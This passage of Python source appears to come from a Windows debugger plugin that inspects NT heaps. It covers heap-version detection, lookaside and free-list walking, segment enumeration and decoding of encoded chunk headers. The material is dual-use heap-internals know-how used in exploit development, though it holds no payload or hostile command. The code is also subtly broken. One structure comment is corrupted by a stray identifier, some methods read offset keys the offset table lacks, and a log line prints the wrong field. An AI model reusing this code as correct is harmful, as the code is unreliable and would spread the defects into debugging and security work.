		if __DEBUGGERAPP__ != "WinDBG":
			return 0
		try:
			sz = dbg.getTypeSize("ntdll!_HEAP")
			return sz if sz else 0
		except:
			return 0

	def getEncodingInfo(self):
		"""
		Read EncodeFlagMask and raw Encoding bytes from the heap.
		Also populates self.EncodeFlagMask and self.Encoding.

		Return: dict with keys:
		  - "encode_enabled"  : bool
		  - "encode_flag_mask": int
		  - "encoding_raw"    : bytes or None
		"""
		return {"encode_enabled": False, "encode_flag_mask": 0, "encoding_raw": None}

	def getEncodingKey(self):
		"""
		Retrieves the Encoding key from the current heap

		Return: Int, containing the Encoding key (on Windows 7 and up)
		or zero on older Operating Systems
		"""
		return 0

	def getChunkHeaderDataOffset(self):
		"""Return the byte offset within a _HEAP_ENTRY at which the
		encoded compact header begins (i.e. after any unencoded prefix).

		On Windows 8+ x64, _HEAP_ENTRY is 16 bytes: the first 8 bytes
		are PreviousBlockPrivateData (unencoded), and the next 8 bytes
		are the encoded compact header (Size/Flags/etc.).
		On all x86 targets and on Windows 7 x64, _HEAP_ENTRY is 8 bytes
		with no unencoded prefix, so the offset is 0.

		Return: int, byte offset to pass as an addend to the chunk pointer
		when reading the encoded compact header.
		"""
		return 0

	def getHeapChunkHeaderAtAddress(self,thischunk,headersize=8,type="chunk"):
		"""
		Will convert the bytes placed at a certain address into an MnChunk object
		"""
		return None


	def getFrontEndHeap(self):
		"""
		Returns the value of the FrontEndHeap field in the heapbase
		"""
		return 0


	def getFrontEndHeapType(self):
		"""
		Returns the value of the FrontEndHeapType field in the heapbase
		"""
		return 0

	def getLookAsideHead(self):
		"""
		Returns the LookAside List Head as a dictionary of dictionaries
		"""
		return self.lalheads

	def showLookAsideHead(self,lalindex):
		return

	def getLookAsideList(self):
		"""
		Retrieves the LookAsideList (if enabled) for the current heap
		Returns : a dictionary, key = LAL index
		Each element in the dictionary contains a dictionary, using a sequence nr as key,
		    and each element in this dictionary contains an MnChunk object
		"""
		return {}

	def getFreeListInUseBitmap(self):
		return []


	def getFreeList(self):
		"""
		Retrieves the FreeLists (XP/2003) for the current heap
		Returns : a dictionary, key = FreeList table index
		Each element in the dictionary contains a dictionary, using the FreeList position as key
			and each element in this dictionary contains an MnChunk object		
		"""
		return {}

	def getFreeBins(self):
		"""Return free chunks organized by size bin (0-127).

		Bin index maps to allocation size: bin N = N * heapgranularity bytes.
		Bin 0 holds chunks > 127 * heapgranularity (the overflow bin).

		Return: dict {bin_index: [MnChunk, ...]}
		        Only populated bins are included.
		"""
		return {}


	def getVirtualAllocdBlocks(self):
		"""
		Retrieves the VirtualAllocdBlocks list from the selected heap

		Return: A dictionary, using the start of a virtualallocdblock as key
		Each entry in the dictionary contains a MnChunk object, with chunktype set to "virtualalloc"
		"""
		return self.VirtualAllocdBlocks

	def getHeapSegmentList(self):
		"""
		Will collect all segments for the current heap object

		Return: A dictionary, using the start of a segment as key
		Each entry in the dictionary has 4 fields :
		start of segment, end of segment, FirstEntry and LastValidEntry
		"""
		return self.SegmentList

	def usesLFH(self):
		"""
		Checks if the current heap has LFH enabled

		Return: Boolean
		"""
		return False
			
	def getLFHAddress(self):
		"""
		Retrieves the address of the Low Fragmentation Heap for the current heap

		Return: Int
		"""
		return 0

	def getState(self):
		"""
		Enumerates all segments, chunks and VirtualAllocdBlocks in the current heap

		Return: array of dicts 
			0 : segments  (with segment addy as key), contains list of chunks 
			1 : vablocks 
		Key: Heap
		Contents:
			Segment -> Chunks
			VA Blocks
		"""
		return {}


class MnNTHeap(MnHeap):
	"""
	NT Heap implementation (_HEAP)
	"""
 
	# _HEAP
	# Windows XP
	# ----------
	# +0x000 Entry            : _HEAP_ENTRY
	# +0x008 Signature        : Uint4B
	# +0x00c Flags            : Uint4B
	# +0x010 ForceFlags       : Uint4B
	# +0x014 VirtualMemoryThreshold : Uint4B
	# +0x018 SegmentReserve   : Uint4B
	# +0x01c SegmentCommit    : Uint4B
	# +0x020 DeCommitFreeBlockThreshold : Uint4B
	# +0x024 DeCommitTotalFreeThreshold : Uint4B
	# +0x028 TotalFreeSize    : Uint4B
	# +0x02c MaximumAllocationSize : Uint4B
	# +0x030 ProcessHeapsListIndex : Uint2B
	# +0x032 HeaderValidateLength : Uint2B
	# +0x034 HeaderValidateCopy : Ptr32 Void
	# +0x038 NextAvailableTagIndex : Uint2B
	# +0x03a MaximumTagIndex  : Uint2B
	# +0x03c TagEntries       : Ptr32 _HEAP_TAG_ENTRY
	# +0x040 UCRSegments      : Ptr32 _HEAP_UCR_SEGMENT
	# +0x044 UnusedUnCommittedRanges : Ptr32 _HEAP_UNCOMMMTTED_RANGE
	# +0x048 AlignRound       : Uint4B
	# +0x04c AlignMask        : Uint4B
	# +0x050 VirtualAllocdBlocks : _LIST_ENTRY
	# +0x058 Segments         : [64] Ptr32 _HEAP_SEGMENT
	# +0x158 u                : __unnamed
	# +0x168 u2               : __unnamed
	# +0x16a AllocatorBackTraceIndex : Uint2B
	# +0x16c NonDedicatedListLength : Uint4B
	# +0x170 LargeBlocksIndex : Ptr32 Void
	# +0x174 PseudoTagEntries : Ptr32 _HEAP_PSEUDO_TAG_ENTRY
	# +0x178 FreeLists        : [128] _LIST_ENTRY
	# +0x578 LockVariable     : Ptr32 _HEAP_LOCK
	# +0x57c CommitRoutine    : Ptr32     long 
	# +0x580 FrontEndHeap     : Ptr32 Void
	# +0x584 FrontHeapLockCount : Uint2B
	# +0x586 FrontEndHeapType : UChar
	# +0x587 LastSegmentIndex : UChar

	# Windows 7
	# ---------
	# +0x000 Entry            : _HEAP_ENTRY
	# +0x008 SegmentSignature : Uint4B
	# +0x00c SegmentFlags     : Uint4B
	# +0x010 SegmentListEntry : _LIST_ENTRY
	# +0x018 Heap             : Ptr32 _HEAP
	# +0x01c BaseAddress      : Ptr32 Void
	# +0x020 NumberOfPages    : Uint4B
	# +0x024 FirstEntry       : Ptr32 _HEAP_ENTRY
	# +0x028 LastValidEntry   : Ptr32 _HEAP_ENTRY
	# +0x02c NumberOfUnCommittedPages : Uint4B
	# +0x030 NumberOfUnCommittedRanges : Uint4B
	# +0x034 SegmentAllocatorBackTraceIndex : Uint2B
	# +0x036 Reserved         : Uint2B
	# +0x038 UCRSegmentList   : _LIST_ENTRY
	# +0x040 Flags            : Uint4B
	# +0x044 ForceFlags       : Uint4B
	# +0x048 CompatibilityFlags : Uint4B
	# +0x04c EncodeFlagMask   : Uint4B
	# +0x050 Encoding         : _HEAP_ENTRY
	# +0x058 PointerKey       : Uint4B
	# +0x05c Interceptor      : Uint4B
	# +0x060 VirtualMemoryThreshold : Uint4B
	# +0x064 Signature        : Uint4B
	# +0x068 SegmentReserve   : Uint4B
	# +0x06c SegmentCommit    : Uint4B
	# +0x070 DeCommitFreeBlockThreshold : Uint4B
	# +0x074 DeCommitTotalFreeThreshold : Uint4B
	# +0x078 TotalFreeSize    : Uint4B
	# +0x07c MaximumAllocationSize : Uint4B
	# +0x080 ProcessHeapsListIndex : Uint2B
	# +0x082 HeaderValidateLength : Uint2B
	# +0x084 HeaderValidateCopy : Ptr32 Void
	# +0x088 NextAvailableTagIndex : Uint2B
	# +0x08a MaximumTagIndex  : Uint2B
	# +0x08c TagEntries       : Ptr32 _HEAP_TAG_ENTRY
	# +0x090 UCRList          : _LIST_ENTRY
	# +0x098 AlignRound       : Uint4B
	# +0x09c AlignMask        : Uint4B
	# +0x0a0 VirtualAllocdBlocks : _LIST_ENTRY
	# +0x0a8 SegmentList      : _LIST_ENTRY
	# +0x0b0 AllocatorBackTraceIndex : Uint2B
	# +0x0b4 NonDedicatedListLength : Uint4B
	# +0x0b8 BlocksIndex      : Ptr32 Void
	# +0xcheckForRecentHeapVersiondex         : Ptr32 Void
	# +0x0c0 PseudoTagEntries : Ptr32 _HEAP_PSEUDO_TAG_ENTRY
	# +0x0c4 FreeLists        : _LIST_ENTRY
	# +0x0cc LockVariable     : Ptr32 _HEAP_LOCK
	# +0x0d0 CommitRoutine    : Ptr32     long 
	# +0x0d4 FrontEndHeap     : Ptr32 Void
	# +0x0d8 FrontHeapLockCount : Uint2B
	# +0x0da FrontEndHeapType : UChar
	# +0x0dc Counters         : _HEAP_COUNTERS
	# +0x130 TuningParameters : _HEAP_TUNING_PARAMETERS	

	# Signature (0xeeffeeff) probe offsets per era: (class, x86, x64)
	#   Era 3 "Hardened" (8/8.1/10/11): 0x060, 0x098  — Counter probe refines to exact subclass
	#   Era 2 "Encoded"  (Vista/7):     0x064, 0x0a0
	#   Era 1 "Raw"      (XP):          0x008, 0x008
	_SIGNATURE_PROBES = None  # built lazily after subclasses exist

	@classmethod
	def _getSignatureProbes(cls):
		if cls._SIGNATURE_PROBES is None:
			cls._SIGNATURE_PROBES = [
				(MnNT8Heap,      archValue(0x060, 0x098)),
				(MnNTVistaHeap,  archValue(0x064, 0x0a0)),
				(MnNTXPHeap,     archValue(0x008, 0x008)),
			]
		return cls._SIGNATURE_PROBES

	@staticmethod
	def _checkForRecentHeapVersion(address):
		"""Return the correct Era-3 subclass (MnNT8Heap, MnNT10Heap, MnNT11Heap).

		Follows the decision tree in heap_version_detection.md:

		1. looks_like_counters at +0x1e0 (x86) / +0x210 (x64)?
		      yes → Win8 / 8.1
		2. looks_like_counters at +0x1f4 (x86) / +0x238 (x64)?
		      yes → read InternalFlags byte at +0x1f3 (x86) / +0x237 (x64)
		            bit 0 set → Win11, else → Win10
		            if InternalFlags unreadable, fall back to:
		            SegmentFlags bit 0x20 at +0x00c (x86) / +0x014 (x64)
		              set → Win11 (Win11 memory manager sets this on heap
		                    segments; not always present, so last resort)
		              else → Win10

		A valid Counters block satisfies all of:
		  - TotalMemoryReserved and TotalMemoryCommitted both non-zero
		  - both page-aligned (% 0x1000 == 0)
		  - committed <= reserved
		  - reserved <= 1 GB (0x40000000)

		osver string is used only as a fallback when both probes are
		inconclusive (e.g. memory read failure on a live target).

		Return: class - one of MnNT8Heap, MnNT10Heap, MnNT11Heap
		"""
		_PAGE           = 0x1000
		_MAX_RESERVE    = 0x40000000                  # 1 GB upper bound
		_COUNTERS_WIN8  = archValue(0x1e0, 0x210)     # Win8/8.1 Counters offset
		_COUNTERS_WIN10 = archValue(0x1f4, 0x238)     # Win10/11 Counters offset
		_INTERNAL_FLAGS = archValue(0x1f3, 0x237)     # byte immediately before Win10/11 Counters
		_SEGMENT_FLAGS  = archValue(0x00c, 0x014)     # _HEAP_SEGMENT.SegmentFlags; heap IS first segment

		def _looks_like_counters(counters_offset):
			try:
				data      = dbg.readMemory(address + counters_offset, 8)
				reserved  = struct.unpack('<L', data[0:4])[0]
				committed = struct.unpack('<L', data[4:8])[0]
				if reserved == 0 or committed == 0:
					return False
				if reserved % _PAGE != 0 or committed % _PAGE != 0:
					return False
				if committed > reserved:
					return False
				if reserved > _MAX_RESERVE:
					return False
				return True
			except:
				return False

		# Probe 1: Win8/8.1 — Counters at +0x1e0 (x86) / +0x210 (x64)
		if _looks_like_counters(_COUNTERS_WIN8):
			return MnNT8Heap

		# Probe 2: Win10/Win11 — Counters at +0x1f4 (x86) / +0x238 (x64)
		if _looks_like_counters(_COUNTERS_WIN10):
			try:
				internal_flags = struct.unpack('<B', dbg.readMemory(address + _INTERNAL_FLAGS, 1))[0]
				if internal_flags & 0x01:
					return MnNT11Heap
				return MnNT10Heap
			except:
				pass
			# InternalFlags unreadable — secondary cross-check: SegmentFlags bit 0x20
			# set by the Win11 memory manager on heap segments (not always present,
			# so only used here as a last resort before defaulting to MnNT10Heap).
			try:
				seg_flags = struct.unpack('<L', dbg.readMemory(address + _SEGMENT_FLAGS, 4))[0]
				if seg_flags & 0x20:
					return MnNT11Heap
			except:
				pass
			return MnNT10Heap

		# Both probes inconclusive — fall back to osver string
		if osver in ("11", "win11"):
			return MnNT11Heap
		if osver in ("10", "win10"):
			return MnNT10Heap
		if osver in ("8", "win8", "8.1", "win8.1"):
			return MnNT8Heap

		return MnNT8Heap   # safe default

	@staticmethod
	def _detectHeapClass(address):
		"""Probe raw memory at *address* and return the correct MnNTHeap subclass.

		Tries each known Signature offset in era order (Era 3 → Era 2 → Era 1).
		For Era 3 (Win8+) delegates to _checkForRecentHeapVersion() to narrow
		down the exact subclass via Counter and InternalFlags probes.
		Falls back to osver-based heuristics when Signature reads fail.

		Return: class - a concrete MnNTHeap subclass
		"""
		_SIG = 0xeeffeeff
		try:
			for target_cls, sig_offset in MnNTHeap._getSignatureProbes():
				sig = struct.unpack('<I', dbg.readMemory(address + sig_offset, 4))[0]
				if sig == _SIG:
					# Era 3 matches Win8, Win10, and Win11 — refine further.
					if target_cls is MnNT8Heap:
						return MnNTHeap._checkForRecentHeapVersion(address)
					return target_cls
		except:
			pass
		# Signature probe failed — use osver for the best available guess
		if osver in ("11", "win11"):
			return MnNT11Heap
		if osver in ("10", "win10"):
			return MnNT10Heap
		if osver in ("8", "win8", "8.1", "win8.1"):
			return MnNT8Heap
		if osver in ("6", "7", "vista", "win7", "2008server"):
			return MnNTVistaHeap
		return MnNTXPHeap

	def __new__(cls, address):
		if cls is MnNTHeap:
			return object.__new__(MnNTHeap._detectHeapClass(address))
		return object.__new__(cls)

	def __init__(self, address):
		super(MnNTHeap, self).__init__(address)
		self.heap_type = HeapType.NT

	def getHeapType(self):
		"""Return the heap type identifier.

		Return: str - "NT"
		"""
		return "NT"

	def getFrontEndHeap(self):
		"""Return the FrontEndHeap pointer from the NT heap header.

		Return: int, address of the front-end heap structure
		"""
		return readPtrSizeBytes(self.heapbase+getOsOffset("FrontEndHeap"))

	def getFrontEndHeapType(self):
		"""Return the FrontEndHeapType byte from the NT heap header.

		Return: int, 0x0 = None, 0x1 = Lookaside, 0x2 = LFH
		"""
		return struct.unpack('B',dbg.readMemory(self.heapbase+getOsOffset("FrontEndHeapType"),1))[0]

	def showLookAsideHead(self,lalindex):
		"""Log the fields of a single LookAside List head entry.

		Arguments:
			lalindex - int, LAL index (0-127) to display
		"""
		if len(self.lalheads) == 0:
			self.getLookAsideHead()
		if lalindex in self.lalheads:
			thislalhead = self.lalheads[lalindex]
			dbg.log("  Next: 0x%08x" % thislalhead["Next"])
			dbg.log("  Depth: 0x%04x" % thislalhead["Depth"])
			dbg.log("  Sequence: 0x%04x" % thislalhead["Sequence"])
			dbg.log("  Depth2: 0x%04x" % thislalhead["Depth2"])
			dbg.log("  MaximumDepth: 0x%04x" % thislalhead["MaximumDepth"])
			dbg.log("  TotalAllocates: 0x%08x" % thislalhead["TotalAllocates"])
			dbg.log("  AllocateMisses/AllocateHits: 0x%08x" % thislalhead["AllocateMisses"])
			dbg.log("  TotalFrees: 0x%08x" % thislalhead["TotalFrees"])
			dbg.log("  FreeMisses/FreeHits: 0x%08x" % thislalhead["FreeMisses"])
			dbg.log("  Type 0x%08x" % thislalhead["Type"])
			dbg.log("  Tag: 0x%08x" % thislalhead["Tag"])
			dbg.log("  Size: 0x%08x" % thislalhead["Size"])
			dbg.log("  Allocate: 0x%08x" % thislalhead["Allocate"])
			dbg.log("  Free: 0x%08x" % thislalhead["AllocateMisses"])
		return 

	def getVirtualAllocdBlocks(self):
		"""Walk the VirtualAllocdBlocks doubly-linked list from the NT heap.

		Return: dict keyed by VA block address, each value is a dict:
		  - "commit_size"  : int
		  - "reserve_size" : int
		"""
		if len(self.VirtualAllocdBlocks) > 0:
			return self.VirtualAllocdBlocks

		va_offset = getOsOffset("VirtualAllocdBlocks")
		listhead = self.heapbase + va_offset

		try:
			entry = readPtrSizeBytes(listhead)
			while entry != listhead:
				vab = MnVirtualAllocdBlocks(entry)
				self.VirtualAllocdBlocks[entry] = {
					"commit_size":  vab.CommitSize,
					"reserve_size": vab.ReserveSize,
				}
				entry = readPtrSizeBytes(entry)
		except:
			pass

		return self.VirtualAllocdBlocks

	def getLFHAddress(self):
		"""Retrieve the address of the Low Fragmentation Heap structure.

		Return: int, address of the LFH
		"""
		return readPtrSizeBytes(self.heapbase+getOsOffset("FrontEndHeap"))

	def getState(self):
		"""Enumerate all segments and chunks in this NT heap.

		Return: dict keyed by segment address, each value is a list
		        of data blocks returned by walkSegment()
		"""
		statedata = {}
		segments = self.getHeapSegmentList()
		for seg in segments:
			FirstEntry = segments[seg]["firstentry"]
			LastValidEntry = segments[seg]["lastentry"]
			datablocks = walkSegment(FirstEntry,LastValidEntry,self.heapbase)
			statedata[seg] = datablocks
		return statedata


class MnNTXPHeap(MnNTHeap):
	"""
	NT Heap implementation for Windows XP/2003.
	"""

	_chunk_entry_class = MnNTXPChunkEntry

	def __init__(self, address):
		super(MnNTXPHeap, self).__init__(address)
		self.heap_version = HeapVersion.XP

	def getChunkHeaderDataOffset(self):
		"""Return byte offset from chunk pointer to the compact _HEAP_ENTRY header.

		On x86 the 8-byte _HEAP_ENTRY starts directly at the chunk pointer (offset 0).
		On x64 the 16-byte _HEAP_ENTRY has PreviousBlockPrivateData (8 bytes) at
		chunk_ptr+0; the compact header begins at chunk_ptr+8.

		Return: int (0 for x86, 8 for x64).
		"""
		return archValue(0, 8)

	# _HEAP field offsets: (offset_x86, offset_x64)
	_offsets = {
		"Entry":                              (0x000, 0x000),
		"Signature":                          (0x008, 0x010),
		"Flags":                              (0x00c, 0x014),
		"VirtualMemoryThreshold":             (0x014, 0x01c),
		"SegmentReserve":                     (0x018, 0x020),
		"SegmentCommit":                      (0x01c, 0x028),
		"DeCommitFreeBlockThreshold":         (0x020, 0x030),
		"DeCommitTotalFreeThreshold":         (0x024, 0x038),
		"TotalFreeSize":                      (0x028, 0x040),
		"MaximumAllocationSize":              (0x02c, 0x048),
		"ProcessHeapsListIndex":              (0x030, 0x050),
		"HeaderValidateLength":               (0x032, 0x052),
		"HeaderValidateCopy":                 (0x034, 0x058),
		"NextAvailableTagIndex":              (0x038, 0x060),
		"MaximumTagIndex":                    (0x03a, 0x062),
		"TagEntries":                         (0x03c, 0x068),
		"UCRSegments":                        (0x040, 0x070),
		"UnusedUnCommittedRanges":            (0x044, 0x078),
		"AlignRound":                         (0x048, 0x080),
		"AlignMask":                          (0x04c, 0x088),
		"VirtualAllocdBlocks":                (0x050, 0x090),
		"Segments":                           (0x058, 0x0a0),
		"AllocatorBackTraceIndex":            (0x16a, 0x2b2),
		"NonDedicatedListLength":             (0x16c, 0x2b4),
		"LargeBlocksIndex":                   (0x170, 0x2b8),
		"PseudoTagEntries":                   (0x174, 0x2c0),
		"FreeLists":                          (0x178, 0x2c8),
		"LockVariable":                       (0x578, 0xac8),
		"CommitRoutine":                      (0x57c, 0xad0),
		"FrontEndHeap":                       (0x580, 0xad8),
		"FrontHeapLockCount":                 (0x584, 0xae0),
		"FrontEndHeapType":                   (0x586, 0xae2),
		"LastSegmentIndex":                   (0x587, 0xae3),
	}

	_arch_index = 1 if arch == 64 else 0

	def getHeapChunkHeaderAtAddress(self,thischunk,headersize=8,type="chunk"):
		"""Decode a heap chunk header (XP format, no encoding).

		Arguments:
			thischunk  - int, address of the chunk header
			headersize - int, size of the header in bytes (default 8)
			type       - str, one of "chunk", "lal", or "freelist"

		Return: MnChunk object, or None if type is not recognized
		"""
		fullheaderbin = ""
		if type == "chunk" or type == "lal" or type == "freelist":
			chunktype = "chunk"
			fullheaderbin = dbg.readMemory(thischunk,headersize)
			if len(fullheaderbin) == headersize:
				thissize = struct.unpack('<H',fullheaderbin[0:2])[0]
				prevsize = struct.unpack('<H',fullheaderbin[2:4])[0]
				segmentid = struct.unpack('<B',fullheaderbin[4:5])[0]
				flag = struct.unpack('<B',fullheaderbin[5:6])[0]
				unused = struct.unpack('<B',fullheaderbin[6:7])[0]
				tag = struct.unpack('<B',fullheaderbin[7:8])[0]
				flink = 0
				blink = 0
				if type == "lal" or type == "freelist":
					flink = struct.unpack('<L',dbg.readMemory(thischunk+headersize,4))[0]
				if type == "freelist":
					blink = struct.unpack('<L',dbg.readMemory(thischunk+headersize+4,4))[0]
				return MnChunk(thischunk,chunktype,headersize,self.heapbase,0,thissize,prevsize,segmentid,flag,unused,tag,flink,blink)
			else:
				return MnChunk(thischunk,chunktype,headersize,self.heapbase,0,0,0,0,0,0,0,0,0)
		return None

	def getLookAsideHead(self):
		"""Read all 128 LookAside List head entries."""
		self.FrontEndHeap = self.getFrontEndHeap()
		self.FrontEndHeapType = self.getFrontEndHeapType()
		if self.FrontEndHeap > 0 and self.FrontEndHeapType == 0x1 and len(self.lalheads) == 0:
			lalindex = 0
			startloc = self.FrontEndHeap
			while lalindex < 128:
				thisptr = self.FrontEndHeap + (0x30 * lalindex)
				lalheadfields = {}
				# read the next 0x30 bytes and break down into lal head elements
				lalheadbin = dbg.readMemory(thisptr,0x30)
				lalheadfields["Next"] = struct.unpack('<L',lalheadbin[0:4])[0]
				lalheadfields["Depth"] = struct.unpack('<H',lalheadbin[4:6])[0]
				lalheadfields["Sequence"] = struct.unpack('<H',lalheadbin[6:8])[0]
				lalheadfields["Depth2"] = struct.unpack('<H',lalheadbin[8:0xa])[0]
				lalheadfields["MaximumDepth"] = struct.unpack('<H',lalheadbin[0xa:0xc])[0]
				lalheadfields["TotalAllocates"] = struct.unpack('<L',lalheadbin[0xc:0x10])[0]
				lalheadfields["AllocateMisses"] = struct.unpack('<L',lalheadbin[0x10:0x14])[0]
				lalheadfields["AllocateHits"] = struct.unpack('<L',lalheadbin[0x10:0x14])[0] 
				lalheadfields["TotalFrees"] = struct.unpack('<L',lalheadbin[0x14:0x18])[0]
				lalheadfields["FreeMisses"] = struct.unpack('<L',lalheadbin[0x18:0x1c])[0]
				lalheadfields["FreeHits"] = struct.unpack('<L',lalheadbin[0x18:0x1c])[0]
				lalheadfields["Type"] = struct.unpack('<L',lalheadbin[0x1c:0x20])[0]
				lalheadfields["Tag"] = struct.unpack('<L',lalheadbin[0x20:0x24])[0]
				lalheadfields["Size"] = struct.unpack('<L',lalheadbin[0x24:0x28])[0]
				lalheadfields["Allocate"] = struct.unpack('<L',lalheadbin[0x28:0x2c])[0]
				lalheadfields["Free"] = struct.unpack('<L',lalheadbin[0x2c:0x30])[0]
				self.lalheads[lalindex] = lalheadfields
				lalindex += 1
		return self.lalheads

	def getLookAsideList(self):
		"""Walk the LookAside Lists and collect all cached chunks."""
		lal = {}
		self.FrontEndHeap = self.getFrontEndHeap()
		self.FrontEndHeapType = self.getFrontEndHeapType()
		if self.FrontEndHeap > 0 and self.FrontEndHeapType == 0x1:
			lalindex = 0
			startloc = self.FrontEndHeap
			while lalindex < 128:
				thisptr = self.FrontEndHeap + (0x30 * lalindex)
				lalhead_flink = struct.unpack('<L',dbg.readMemory(thisptr,4))[0]
				if lalhead_flink != 0:
					thissize = (lalindex * 8)
					next_flink = lalhead_flink
					seqnr = 0
					thislal = {} 
					while next_flink != 0 and next_flink != startloc:
						chunk = self.getHeapChunkHeaderAtAddress(next_flink-8,8,"lal")
						next_flink = chunk.flink
						thislal[seqnr] = chunk
						seqnr += 1
					lal[lalindex] = thislal
				lalindex += 1
		return lal

	def getFreeListInUseBitmap(self):
		"""Read the FreeListInUse bitmap from the NT heap."""
		if not self.heapbase in mnproc.FreeListBitmap:
			bitmap_offset = self._offsets["FreeListInUse"][self._arch_index]
			FreeListBitmapHeap = []
			cnt = 0
			while cnt < 4:
				fldword = dbg.readLong(self.heapbase+bitmap_offset + (4 * cnt))
				bitmapbits = DwordToBits(fldword)
				for thisbit in bitmapbits:
					FreeListBitmapHeap.append(thisbit)
				cnt += 1
			mnproc.FreeListBitmap[self.heapbase] = FreeListBitmapHeap
		return mnproc.FreeListBitmap[self.heapbase]

	def getFreeList(self):
		"""Walk the 128 FreeLists of the NT heap."""
		freelists = {}
		freelists_offset = self._offsets["FreeLists"][self._arch_index]
		flindex = 0
		while flindex < 128:
			freelistflink = self.heapbase + freelists_offset + (8 * flindex) + 4
			freelistblink = self.heapbase + freelists_offset + (8 * flindex)
			endchain = False
			try:
				tblink = struct.unpack('<L',dbg.readMemory(freelistflink,4))[0]
				tflink = struct.unpack('<L',dbg.readMemory(freelistblink,4))[0]
				origblink = freelistblink
				if freelistblink != tblink:
					thisfreelist = {}
					endchain = False
					thisfreelistindex = 0
					pflink = 0
					while not endchain:
						try:
							freelistentry = self.getHeapChunkHeaderAtAddress(tflink-8,8,"freelist")
							thisfreelist[thisfreelistindex] = freelistentry
							thisfreelistindex += 1
							thisblink = struct.unpack('<L',dbg.readMemory(tflink+4,4))[0]
							thisflink = struct.unpack('<L',dbg.readMemory(tflink,4))[0]
							tflink=thisflink
							if (tflink == origblink) or (tflink == pflink):
								endchain = True
							pflink = tflink 
						except:
							endchain = True
					freelists[flindex] = thisfreelist
			except:
				continue
			flindex += 1
		return freelists

	def getFreeBins(self):
		"""Return free chunks organized by size bin (0-127).

		XP has a natural 1:1 mapping from FreeLists[0..127] to bins.

		Return: dict {bin_index: [MnChunk, ...]}
		"""
		bins = {}
		freelists = self.getFreeList()
		for flindex, entries in freelists.items():
			chunks = [entries[k] for k in sorted(entries.keys())]
			if chunks:
				bins[flindex] = chunks
		return bins

	def getHeapSegmentList(self):
		"""Walk the XP _HEAP.Segments[64] pointer array.

		Return: dict keyed by segment address, each value is a dict:
		  - "base"       : int, BaseAddress
		  - "end"        : int, BaseAddress + NumberOfPages * 0x1000
		  - "pages"      : int, NumberOfPages
		  - "firstentry" : int, FirstEntry
		  - "lastentry"  : int, LastValidEntry
		"""
		if len(self.SegmentList) > 0:
			return self.SegmentList

		try:
			segarr_off = self._offsets["SegmentsArray"][self._arch_index]
			ptrsize = archValue(4, 8)

			for i in range(64):
				segaddr = readPtrSizeBytes(self.heapbase + segarr_off + (i * ptrsize))
				if segaddr == 0:
					break
				seg = MnNTXPSegment(segaddr)
				self.SegmentList[segaddr] = {
					"base": seg.BaseAddress,
					"end": seg.end,
					"pages": seg.NumberOfPages,
					"firstentry": seg.FirstEntry,
					"lastentry": seg.LastValidEntry,
				}
		except:
			pass

		return self.SegmentList

class MnNTVistaHeap(MnNTHeap):
	"""
	NT Heap implementation for Windows Vista / 7.
	"""

	_chunk_entry_class = MnNTVistaChunkEntry

	def __init__(self, address):
		super(MnNTVistaHeap, self).__init__(address)
		self.heap_version = HeapVersion.VISTA

	def getChunkHeaderDataOffset(self):
		"""Return byte offset from chunk pointer to the compact _HEAP_ENTRY header.

		On x86 the 8-byte _HEAP_ENTRY starts directly at the chunk pointer (offset 0).
		On x64 (Vista native) the 16-byte _HEAP_ENTRY has PreviousBlockPrivateData
		(8 bytes) at chunk_ptr+0; the compact header begins at chunk_ptr+8.

		Return: int (0 for x86, 8 for x64).
		"""
		return archValue(0, 8)

	def getEncodingInfo(self):
		"""Read EncodeFlagMask and raw Encoding bytes from the NT heap.

		Return: dict with keys:
		  - "encode_enabled"  : bool, True if EncodeFlagMask != 0
		  - "encode_flag_mask": int, raw EncodeFlagMask value
		  - "encoding_raw"    : bytes or None, raw Encoding field
		"""
		self.getEncodingKey()
		encoding_offset = archValue(0x050, 0x080)
		encoding_size = archValue(8, 16)
		encoding_raw = None
		try:
			encoding_raw = dbg.readMemory(self.heapbase + encoding_offset, encoding_size)
		except:
			pass
		return {
			"encode_enabled": (self.EncodeFlagMask != 0),
			"encode_flag_mask": self.EncodeFlagMask,
			"encoding_raw": encoding_raw,
		}

	def getEncodingKey(self):
		"""Retrieve the Encoding key from the NT heap header.

		Return: int, the Encoding key (8 bytes, _HEAP_ENTRY sized)
		"""
		self.Encoding = 0
		offset = archValue(0x4c,0x7c)
		self.EncodeFlagMask = struct.unpack('<L',dbg.readMemory(self.heapbase+offset,4))[0]
		if self.EncodeFlagMask == 0x100000:
			encoding_offset = archValue(0x50, 0x80)
			self.Encoding = struct.unpack('<Q',dbg.readMemory(self.heapbase+encoding_offset,8))[0]
		return self.Encoding

	def getHeapChunkHeaderAtAddress(self,thischunk,headersize=8,type="chunk"):
		"""Decode a heap chunk header (Win7+ format, with encoding).

		Arguments:
			thischunk  - int, address of the chunk header
			headersize - int, size of the header in bytes (default 8)
			type       - str, one of "chunk", "lal", or "freelist"

		Return: MnChunk object, or None if type is not recognized
		"""
		key = self.getEncodingKey()
		fullheaderbin = ""
		if type == "chunk" or type == "lal" or type == "freelist":
			chunktype = "chunk"
			fullheaderbin = decodeHeapHeader(thischunk,headersize,key)
			if len(fullheaderbin) == headersize:
				thissize = struct.unpack('<H',fullheaderbin[0:2])[0]
				flag = struct.unpack('<B',fullheaderbin[2:3])[0]
				tag = struct.unpack('<B',fullheaderbin[3:4])[0]
				prevsize = struct.unpack('<H',fullheaderbin[4:6])[0]
				segmentid = struct.unpack('<B',fullheaderbin[6:7])[0]
				unused = struct.unpack('<B',fullheaderbin[7:8])[0]
				flink = 0
				blink = 0
				if type == "lal" or type == "freelist":
					flink = struct.unpack('<L',dbg.readMemory(thischunk+headersize,4))[0]
				if type == "freelist":
					blink = struct.unpack('<L',dbg.readMemory(thischunk+headersize+4,4))[0]
				return MnChunk(thischunk,chunktype,headersize,self.heapbase,0,thissize,prevsize,segmentid,flag,unused,tag,flink,blink)
			else:
				return MnChunk(thischunk,chunktype,headersize,self.heapbase,0,0,0,0,0,0,0,0,0)
		return None

	def getHeapSegmentList(self):
		"""Walk the Win7+ _HEAP.SegmentList doubly-linked list.

		Return: dict keyed by segment address, each value is a dict:
		  - "base"       : int, BaseAddress
		  - "end"        : int, BaseAddress + NumberOfPages * 0x1000
		  - "pages"      : int, NumberOfPages
		  - "firstentry" : int, FirstEntry
		  - "lastentry"  : int, LastValidEntry
		"""
		if len(self.SegmentList) > 0:
			return self.SegmentList

		try:
			sle_offset = MnNTVistaSegment._offsets["SegmentListEntry"][MnNTVistaSegment._arch_index]

			# _HEAP.SegmentList head
			listhead = self.heapbase + getOsOffset("SegmentList")
			entry = readPtrSizeBytes(listhead)

			ptrsize = archValue(4, 8)
			while entry != listhead:
